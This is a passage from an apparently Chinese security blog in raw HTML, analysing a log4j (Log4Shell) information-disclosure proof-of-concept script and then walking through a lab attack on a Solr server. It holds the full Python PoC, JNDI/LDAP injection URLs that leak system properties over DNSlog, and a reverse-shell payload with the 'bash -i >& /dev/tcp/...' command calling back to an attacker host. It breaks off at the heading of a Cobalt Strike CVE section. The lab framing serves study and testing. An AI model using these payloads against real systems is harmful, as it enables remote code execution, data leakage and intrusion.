class=\"string\">b&#x27;\\x30\\x0c\\x02\\x01\\x01\\x61\\x07\\x0a\\x01\\x00\\x04\\x00\\x04\\x00\\x0a&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">handle</span>(<span class=\"params\">self</span>) -&gt; <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| new connection from <span class=\"subst\">&#123;self.client_address[<span class=\"number\">0</span>]&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        sock = self.request</span><br><span class=\"line\">        sock.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        sock.sendall(LDAP_HEADER)</span><br><span class=\"line\"></span><br><span class=\"line\">        data = sock.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        data = data[<span class=\"number\">9</span>:]  <span class=\"comment\"># strip header</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># example response</span></span><br><span class=\"line\">        <span class=\"comment\">#</span></span><br><span class=\"line\">        <span class=\"comment\"># (&#x27;Java version 11.0.13\\n&#x27;</span></span><br><span class=\"line\">        <span class=\"comment\">#  &#x27;\\x01\\x00\\n&#x27;</span></span><br><span class=\"line\">        <span class=\"comment\">#  &#x27;\\x01\\x03\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x0b&#x27;</span></span><br><span class=\"line\">        <span class=\"comment\">#  &#x27;objectClass0\\x00\\x1b0\\x19\\x04\\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">        data = data.decode(errors=<span class=\"string\">&#x27;ignore&#x27;</span>).split(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; v| extracted value: <span class=\"subst\">&#123;data&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">&#x27;a simple log4j</span></span><br><span class=\"line\"><span class=\"string\">&lt;=2.14 information disclosure poc &#x27;</span></span><br><span class=\"line\">                                                 <span class=\"string\">&#x27;(ref:</span></span><br><span class=\"line\"><span class=\"string\">https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--target&#x27;</span>, <span class=\"string\">&#x27;-t&#x27;</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;target uri&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--listen-host&#x27;</span>, default=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>,</span><br><span class=\"line\">                        <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;exploit server host to listen on</span></span><br><span class=\"line\"><span class=\"string\">(default: 127.0.0.1)&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--listen-port&#x27;</span>, <span class=\"string\">&#x27;-lp&#x27;</span>, default=<span class=\"number\">8888</span>,</span><br><span class=\"line\"><span class=\"built_in\">help</span>=<span class=\"string\">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--exploit-host&#x27;</span>, <span class=\"string\">&#x27;-eh&#x27;</span>, required=<span class=\"literal\">True</span>,</span><br><span class=\"line\">default=<span class=\"string\">&#x27;127.0.0.1&#x27;</span>,</span><br><span class=\"line\">                        <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--leak&#x27;</span>, <span class=\"string\">&#x27;-l&#x27;</span>, default=<span class=\"string\">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class=\"line\">                        <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;value to leak. &#x27;</span></span><br><span class=\"line\">                             <span class=\"string\">&#x27;see:</span></span><br><span class=\"line\"><span class=\"string\">https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span></span><br><span class=\"line\">                             <span class=\"string\">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| starting server on <span class=\"subst\">&#123;args.listen_host&#125;</span>:<span class=\"subst\">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class=\"line\">ThreadedTCPRequestHandler)</span><br><span class=\"line\"></span><br><span class=\"line\">    serv_thread = threading.Thread(target=server.serve_forever)</span><br><span class=\"line\">    serv_thread.daemon = <span class=\"literal\">True</span></span><br><span class=\"line\">    serv_thread.start()</span><br><span class=\"line\">    time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| server started&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload = <span class=\"string\">f&#x27;$&#123;&#123;jndi:ldap://<span class=\"subst\">&#123;args.exploit_host&#125;</span>:<span class=\"subst\">&#123;args.listen_port&#125;</span>/<span class=\"subst\">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| sending exploit payload <span class=\"subst\">&#123;payload&#125;</span> to <span class=\"subst\">&#123;args.target&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        r = requests.get(args.target, headers=&#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| response status code: <span class=\"subst\">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| response: <span class=\"subst\">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; e| failed to make request: <span class=\"subst\">&#123;e&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        server.shutdown()</span><br><span class=\"line\">        server.server_close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()                </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"信息泄露脚本分析\"><a href=\"#信息泄露脚本分析\" class=\"headerlink\" title=\"信息泄露脚本分析\"></a>信息泄露脚本分析</h3><h4 id=\"LDAP-HEADER\"><a href=\"#LDAP-HEADER\" class=\"headerlink\" title=\"LDAP_HEADER\"></a>LDAP_HEADER</h4><p>定义 <code>LDAP_HEADER</code> 常量，这是响应 <code>LDAP</code> 请求时使用的头信息</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LDAP_HEADER = <span class=\"string\">b&#x27;\\x30\\x0c\\x02\\x01\\x01\\x61\\x07\\x0a\\x01\\x00\\x04\\x00\\x04\\x00\\x0a&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"ThreadedTCPRequestHandler\"><a href=\"#ThreadedTCPRequestHandler\" class=\"headerlink\" title=\"ThreadedTCPRequestHandler\"></a>ThreadedTCPRequestHandler</h4><p>这里定义<code>ThreadedTCPRequestHandler</code> 类的 <code>handle()</code> 方法用于处理来自客户端的连接。</p>\n<p>该方法首先输出来自客户端的连接信息，然后通过调用 <code>sock.recv()</code> 和 <code>sock.sendall()</code> 方法读取客户端发送</p>\n<p>的数据，并发送响应数据</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">handle</span>(<span class=\"params\">self</span>) -&gt; <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| new connection from <span class=\"subst\">&#123;self.client_address[<span class=\"number\">0</span>]&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        sock = self.request</span><br><span class=\"line\">        sock.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        sock.sendall(LDAP_HEADER)</span><br><span class=\"line\"></span><br><span class=\"line\">        data = sock.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">        data = data[<span class=\"number\">9</span>:]  <span class=\"comment\"># strip header</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># example response</span></span><br><span class=\"line\">        <span class=\"comment\">#</span></span><br><span class=\"line\">        <span class=\"comment\"># (&#x27;Java version 11.0.13\\n&#x27;</span></span><br><span class=\"line\">        <span class=\"comment\">#  &#x27;\\x01\\x00\\n&#x27;</span></span><br><span class=\"line\">        <span class=\"comment\">#  &#x27;\\x01\\x03\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x0b&#x27;</span></span><br><span class=\"line\">        <span class=\"comment\">#  &#x27;objectClass0\\x00\\x1b0\\x19\\x04\\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">        data = data.decode(errors=<span class=\"string\">&#x27;ignore&#x27;</span>).split(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; v| extracted value: <span class=\"subst\">&#123;data&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"ThreadedTCPServer\"><a href=\"#ThreadedTCPServer\" class=\"headerlink\" title=\"ThreadedTCPServer\"></a>ThreadedTCPServer</h4><p><code>ThreadedTCPServer</code> 类是一个多线程 <code>TCP</code> 服务器，它继承自 <code>socketserver.ThreadingMixIn</code> 和 </p>\n<p><code>socketserver.TCPServer</code> 类。这意味着它可以同时处理多个客户端连接。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main()\"></a>main()</h4><p>main()函数使用模块设置命令行参数解析器argparse，然后解析命令行参数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">&#x27;a simple log4j&lt;=2.14 information disclosure poc &#x27;</span>                              <span class=\"string\">&#x27;(ref:https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>下面的类似<code>-t,-lh,-lp</code>等等就是解析器设置为接受命令行参数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--target&#x27;</span>, <span class=\"string\">&#x27;-t&#x27;</span>, required=<span class=\"literal\">True</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;target uri&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--listen-host&#x27;</span>, default=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>,<span class=\"built_in\">help</span>=<span class=\"string\">&#x27;exploit server host to listen on(default: 127.0.0.1)&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--listen-port&#x27;</span>, <span class=\"string\">&#x27;-lp&#x27;</span>, default=<span class=\"number\">8888</span>,</span><br><span class=\"line\"><span class=\"built_in\">help</span>=<span class=\"string\">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--exploit-host&#x27;</span>, <span class=\"string\">&#x27;-eh&#x27;</span>, required=<span class=\"literal\">True</span>,</span><br><span class=\"line\">default=<span class=\"string\">&#x27;127.0.0.1&#x27;</span>,<span class=\"built_in\">help</span>=<span class=\"string\">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;--leak&#x27;</span>, <span class=\"string\">&#x27;-l&#x27;</span>, default=<span class=\"string\">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class=\"line\">                        <span class=\"built_in\">help</span>=<span class=\"string\">&#x27;value to leak. &#x27;</span><span class=\"string\">&#x27;see:https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span><span class=\"string\">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><code>parse_args()</code> 方法用于解析命令行参数，并将解析后的参数值存储在一个名为 <code>args</code> 的变量中</p>\n<p>例如，在执行脚本后加的命令行参数<code>--listen-port 8080</code>就转变为了<code>args.listen_port = 8080</code>，这样在后续</p>\n<p>代码调用不同参数时，可直接调用<code>arg</code>来实现</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">args = parser.parse_args()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>这里先创建一个基于线程的 <code>TCP</code> 服务器，并使用 <code>args.listen_host</code> 和 <code>args.listen_port</code> 来指定的主机和端</p>\n<p>口启动，并使用 <code>ThreadedTCPRequestHandler</code> 类来处理每个请求【也就是前面提到的】</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| starting server on <span class=\"subst\">&#123;args.listen_host&#125;</span>:<span class=\"subst\">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class=\"line\">ThreadedTCPRequestHandler)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>这里主要是先创建一个 <code>threading.Thread</code> 对象，并将服务器的 <code>serve_forever()</code> 方法作为其目标。这个方法</p>\n<p>就是字面意思，它会一直运行，直到服务器被关闭。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">serv_thread = threading.Thread(target=server.serve_forever)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><code>daemon</code> 属性是 <code>Python</code> 中的线程特有属性，它表示该线程是否为守护线程，如果一个线程是守护线程，</p>\n<p>那么当程序退出时，它也会被中断。</p>\n<p>而这里的被设置为<code>ture</code>，所以这意味着程序退出时，线程将被中断。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">serv_thread.daemon = <span class=\"literal\">True</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>然后就是启动线程，并延迟 <code>1</code> 秒钟，来确保服务器完全启动</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">serv_thread.start()</span><br><span class=\"line\">time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| server started&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">f&#x27;$&#123;&#123;jndi:ldap://<span class=\"subst\">&#123;args.exploit_host&#125;</span>:<span class=\"subst\">&#123;args.listen_port&#125;</span>/<span class=\"subst\">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| sending exploit payload <span class=\"subst\">&#123;payload&#125;</span> to <span class=\"subst\">&#123;args.target&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>这里使用 <code>try-finally</code> 语句块向服务器发送<code>payload</code>:</p>\n<p><code>$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;</code></p>\n<p>并打印服务器的响应状态码，以及响应的文本内容</p>\n<p>最后调用服务器的 <code>shutdown()</code> 和 <code>server_close()</code> 方法，以关闭服务器，即使在发送 <code>HTTP</code> 请求时发生异常也是如此。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    r = requests.get(args.target, headers=&#123;<span class=\"string\">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| response status code: <span class=\"subst\">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; i| response: <span class=\"subst\">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27; e| failed to make request: <span class=\"subst\">&#123;e&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">finally</span>:</span><br><span class=\"line\">    server.shutdown()</span><br><span class=\"line\">    server.server_close()</span><br></pre></td></tr></table></figure>\n\n<p>这里就是一个常见的语句，如果脚本是独立执行的，则直接就调用 <code>main()</code> 函数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()    </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"渗透测试\"><a href=\"#渗透测试\" class=\"headerlink\" title=\"渗透测试\"></a>渗透测试</h2><h3 id=\"利用DNSlog验证漏洞\"><a href=\"#利用DNSlog验证漏洞\" class=\"headerlink\" title=\"利用DNSlog验证漏洞\"></a>利用DNSlog验证漏洞</h3><p>访问<code>http://www.dnslog.cn/</code></p>\n<p>先<code>Get SubDomain</code>获取一个子域名</p>\n<p><img src=\"/post/CVE-Tes/image-20221220145121926.png\" alt=\"image-20221220145121926\"></p>\n<p>但是既然是注入，那肯定是存在参数注入点，查看官方<code>solr</code>文档，得到在<code>cores</code>里</p>\n<p><img src=\"/post/CVE-Tes/image-20221220145505204.png\" alt=\"image-20221220145505204\"></p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"regexp\">/admin/</span>cores?action=</span><br></pre></td></tr></table></figure>\n\n<p>其中<code>action</code>参数可控，有很大可能是注入点</p>\n<p>于是把我们的<code>dnslog</code>获取的子域名按<code>payload</code>形式添加到<code>url</code>后参数中</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span><span class=\"number\">192.168</span>.<span class=\"number\">80.131</span>:<span class=\"number\">8983</span><span class=\"regexp\">/solr/</span>admin<span class=\"regexp\">/cores?action=$&#123;jndi:ldap:/</span>/<span class=\"number\">4</span>d5do5.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>\n\n<p>访问查看</p>\n<p><code>DNSlog</code>收到了访问请求</p>\n<p><img src=\"/post/CVE-Tes/image-20221220145131607.png\" alt=\"image-20221220145131607\"></p>\n<p>同时在靶机页面下也有<code>DNSlog</code>子域名回显，虽然是</p>\n<p><img src=\"/post/CVE-Tes/image-20221220145054026.png\" alt=\"image-20221220145054026\"></p>\n<p>说明这里的<code>$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;</code>，确实达到了访问的作用</p>\n<p>故此推断<code>log4j2</code>漏洞存在</p>\n<h3 id=\"信息泄露漏洞\"><a href=\"#信息泄露漏洞\" class=\"headerlink\" title=\"信息泄露漏洞\"></a>信息泄露漏洞</h3><p>这里可以利用脚本分析中<code>exploitdb</code>里的信息泄露脚本即可</p>\n<p>按照脚本原理也是利用占位符，也就是<code>payload</code>的形式，但是参数为系统属性，这些属性会自动返回对应的值，</p>\n<p>最后脚本通过对返回数据的解析，就可以得到敏感数据</p>\n<p>当然直接通过访问得到消息也是可以的</p>\n<p>比如<code>$&#123;sys:os.version&#125;</code>，就得到我们靶机的系统内核版本号为<code>5.15.0-56-generic</code></p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span><span class=\"number\">192.168</span>.<span class=\"number\">80.131</span>:<span class=\"number\">8983</span><span class=\"regexp\">/solr/</span>admin<span class=\"regexp\">/cores?action=$&#123;jndi:ldap:/</span>/<span class=\"variable\">$&#123;sys:os.version&#125;</span>.<span class=\"number\">7</span>b09py.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221220220840849.png\" alt=\"image-20221220220840849\"></p>\n<p>对于<code>usr.name</code>，以及<code>os.name</code>等等都是可以实现</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span><span class=\"number\">192.168</span>.<span class=\"number\">80.131</span>:<span class=\"number\">8983</span><span class=\"regexp\">/solr/</span>admin<span class=\"regexp\">/cores?action=$&#123;jndi:ldap:/</span>/<span class=\"variable\">$&#123;sys:user.name&#125;</span>.<span class=\"number\">7</span>b09py.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/post/CVE-Tes/image-20221220175405653.png\" alt=\"image-20221220175405653\"></p>\n<p>以下就是在<code>log4j2</code>其他可用系统属性列表</p>\n<p><img src=\"/post/CVE-Tes/image-20221220170944260.png\" alt=\"image-20221220170944260\"></p>\n<h3 id=\"远程代码执行漏洞\"><a href=\"#远程代码执行漏洞\" class=\"headerlink\" title=\"远程代码执行漏洞\"></a>远程代码执行漏洞</h3><figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">攻击机kali <span class=\"built_in\">ip</span>:<span class=\"number\">192</span>.<span class=\"number\">168</span>.<span class=\"number\">80</span>.<span class=\"number\">128</span></span><br><span class=\"line\">攻击机kali 监听端口:<span class=\"number\">8888</span></span><br><span class=\"line\">靶机ubuntu <span class=\"built_in\">ip</span>:<span class=\"number\">192</span>.<span class=\"number\">168</span>.<span class=\"number\">80</span>.<span class=\"number\">131</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell\"><a href=\"#JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell\" class=\"headerlink\" title=\"JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell\"></a>JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell</h4><p>该工具的原理我剖析了一下，</p>\n<p>先启动工具</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">java</span> -jar JNDIExploit-<span class=\"number\">1</span>.<span class=\"number\">2</span>-SNAPSHOT.jar -i <span class=\"number\">192.168.80.128</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/CVE-Tes/image-20221221163132059.png\" alt=\"image-20221221163132059\"></p>\n<p>简单来讲就是在攻击机【<code>192.168.80.128</code>】的的<code>1389</code>端口搭建起了一个服务器，其中放置了一个恶意类，</p>\n<p>通过利用靶机网站<code>JNDI</code>注入漏洞把这个恶意类进行远程加载，从而执行了命令</p>\n<p>利用<code>JNDIExploit-1.2-SNAPSHOT.jar</code>最好的就是简化了<code>1.0</code>的繁杂参数</p>\n<p>只需要构造<code>payload</code></p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"regexp\">//</span><span class=\"number\">192.168</span>.<span class=\"number\">80.131</span>:<span class=\"number\">8983</span><span class=\"regexp\">/solr/</span>admin<span class=\"regexp\">/cores?action=$&#123;jndi:ldap:/</span><span class=\"regexp\">/192.168.80.128:1389/</span>Basic<span class=\"regexp\">/ReverseShell/</span><span class=\"number\">192.168</span>.<span class=\"number\">80.128</span>/<span class=\"number\">6666</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>/Basic/ReverseShell/</code>中其实就包含反弹<code>shell</code>的命令</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -<span class=\"selector-tag\">i</span> &gt;&amp; /dev/tcp/xx<span class=\"selector-class\">.xx</span><span class=\"selector-class\">.xx</span>.xx/xxxx <span class=\"number\">0</span>&gt;&amp;<span class=\"number\">1</span></span><br><span class=\"line\">*这里的</span><br><span class=\"line\">/xx<span class=\"selector-class\">.xx</span><span class=\"selector-class\">.xx</span>.xx/xxxx</span><br><span class=\"line\">就是其后跟上的参数</span><br><span class=\"line\">/<span class=\"number\">192.168</span>.<span class=\"number\">80.128</span>/<span class=\"number\">6666</span></span><br></pre></td></tr></table></figure>\n\n<p>于是就是<code>/Basic/ReverseShell/192.168.80.128/6666</code>被恶意类包含</p>\n<p>然后在攻击机监听<code>6666</code>端口</p>\n<p><img src=\"/post/CVE-Tes/image-20221221203418508.png\" alt=\"image-20221221203418508\"></p>\n<p>最后访问<code>payload</code>，触发</p>\n<p><img src=\"/post/CVE-Tes/image-20221221203458628.png\" alt=\"image-20221221203458628\"></p>\n<p>成功反弹到<code>shell</code></p>\n<p><img src=\"/post/CVE-Tes/image-20221221203538282.png\" alt=\"image-20221221203538282\"></p>\n<p>测试完毕</p>\n<h1 id=\"CVE-2022-39197-Cobaltstrike-RCE\"><a href=\"#CVE-2022-39197-Cobaltstrike-RCE\" class=\"headerlink\" title=\"CVE-2022-39197 Cobaltstrike RCE\"></a>CVE-2022-39197 Cobaltstrike RCE</h1><h2 id=\"环境搭建-1\"><a href=\"#环境搭建-1\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><h1 